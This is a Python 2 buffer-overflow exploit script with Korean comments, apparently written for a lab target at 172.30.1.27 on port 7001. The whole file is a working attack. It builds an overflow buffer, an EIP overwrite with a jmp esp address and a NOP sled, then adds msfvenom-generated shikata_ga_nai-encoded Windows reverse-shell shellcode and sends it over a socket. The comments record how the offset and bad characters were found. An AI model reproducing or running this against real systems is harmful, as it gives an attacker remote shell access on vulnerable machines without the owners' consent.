#!/usr/bin/python

from socket import *

try:
        print "\nSending Buffer Start"

        #버퍼 크기 측정
        #buffer="\x41"*8000
        #locate msf-pattern
        #/usr/bin/msf-pattern_create -l 3000
        #/usr/bin/msf-pattern_offset -l 3000 -q 33794332
        
        buffer="\x41"*2288

        #jmp esp 기계어 찾기
        #/usr/bin/msf-nasm_shell
        eip="\xCF\x10\x80\x14"
        nops="\x90"*300

        #payload 끊김 방지 (github)
        badchars = ( "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

        #msfvenom -p windows/shell_reverse-tcp lhost=<IP 주소> lport=<port 주소> -f c -e x86/shikata_ga_nai -b "\x00" 
        shellcode = ("\xbd\xdf\x97\x98\x55\xd9\xc3\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x6a\x12\x03\x6a\x12\x83\x35\x6b\x7a\xa0\x35\x7c\xf9"
"\x4b\xc5\x7d\x9e\xc2\x20\x4c\x9e\xb1\x21\xff\x2e\xb1\x67\x0c"
"\xc4\x97\x93\x87\xa8\x3f\x94\x20\x06\x66\x9b\xb1\x3b\x5a\xba"
"\x31\x46\x8f\x1c\x0b\x89\xc2\x5d\x4c\xf4\x2f\x0f\x05\x72\x9d"
"\xbf\x22\xce\x1e\x34\x78\xde\x26\xa9\xc9\xe1\x07\x7c\x41\xb8"
"\x87\x7f\x86\xb0\x81\x67\xcb\xfd\x58\x1c\x3f\x89\x5a\xf4\x71"
"\x72\xf0\x39\xbe\x81\x08\x7e\x79\x7a\x7f\x76\x79\x07\x78\x4d"
"\x03\xd3\x0d\x55\xa3\x90\xb6\xb1\x55\x74\x20\x32\x59\x31\x26"
"\x1c\x7e\xc4\xeb\x17\x7a\x4d\x0a\xf7\x0a\x15\x29\xd3\x57\xcd"
"\x50\x42\x32\xa0\x6d\x94\x9d\x1d\xc8\xdf\x30\x49\x61\x82\x5c"
"\xbe\x48\x3c\x9d\xa8\xdb\x4f\xaf\x77\x70\xc7\x83\xf0\x5e\x10"
"\xe3\x2a\x26\x8e\x1a\xd5\x57\x87\xd8\x81\x07\xbf\xc9\xa9\xc3"
"\x3f\xf5\x7f\x43\x6f\x59\xd0\x24\xdf\x19\x80\xcc\x35\x96\xff"
"\xed\x36\x7c\x68\x87\xcd\x17\x3b\x46\xcc\xcd\x2b\x75\xce\x10"
"\x17\xf0\x28\x78\x77\x55\xe3\x15\xee\xfc\x7f\x87\xef\x2a\xfa"
"\x87\x64\xd9\xfb\x46\x8d\x94\xef\x3f\x7d\xe3\x4d\xe9\x82\xd9"
"\xf9\x75\x10\x86\xf9\xf0\x09\x11\xae\x55\xff\x68\x3a\x48\xa6"
"\xc2\x58\x91\x3e\x2c\xd8\x4e\x83\xb3\xe1\x03\xbf\x97\xf1\xdd"
"\x40\x9c\xa5\xb1\x16\x4a\x13\x74\xc1\x3c\xcd\x2e\xbe\x96\x99"
"\xb7\x8c\x28\xdf\xb7\xd8\xde\x3f\x09\xb5\xa6\x40\xa6\x51\x2f"
"\x39\xda\xc1\xd0\x90\x5e\xf1\x9a\xb8\xf7\x9a\x42\x29\x4a\xc7"
"\x74\x84\x89\xfe\xf6\x2c\x72\x05\xe6\x45\x77\x41\xa0\xb6\x05"
"\xda\x45\xb8\xba\xdb\x4f")
        
        #BOF attack by shellcode
        payload =buffer+eip+nops+shellcode

        #Bad Character Check
        #payload = buffer+eip+badchars
        sock=socket(AF_INET, SOCK_STREAM)
        sock.connect(("172.30.1.27",7001))
        sock.send(payload)
        sock.close()

        print "\nSending Buffer Complete"
except:
        print "\nSending Buffer Fail"

